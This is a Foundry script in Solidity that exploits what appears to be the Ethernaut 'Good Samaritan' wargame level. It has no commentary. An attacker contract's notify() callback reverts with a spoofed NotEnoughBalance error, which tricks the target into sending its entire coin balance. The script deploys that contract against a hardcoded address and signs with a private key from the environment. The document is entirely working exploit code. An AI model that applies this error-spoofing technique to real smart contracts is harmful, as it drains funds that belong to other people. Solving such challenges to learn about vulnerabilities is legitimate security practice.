// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "../src/GoodSamaritan.sol";
import {Script} from "forge-std/Script.sol";

contract AttackerContact {
    error NotEnoughBalance();

    function notify(uint256 amount) public {
        if (amount <= 10) {
            revert NotEnoughBalance();
        }
    }

    function attack(address _address) public {
        GoodSamaritan goodSamaritan = GoodSamaritan(_address);

        goodSamaritan.requestDonation();
    }
}

contract GoodSamaritanAttack is Script {
    GoodSamaritan public goodSamaritan = GoodSamaritan(0x44c5aF92E56Cccb2643A3b6f73E182372525b25d);
    Wallet public wallet = Wallet(address(goodSamaritan.wallet()));
    Coin public coin = Coin(address(goodSamaritan.coin()));

    function run() external {
        vm.startBroadcast(vm.envUint("PRIVATE_KEY"));

        AttackerContact attackerContact = new AttackerContact();

        attackerContact.attack(address(goodSamaritan));

        vm.stopBroadcast();
    }
}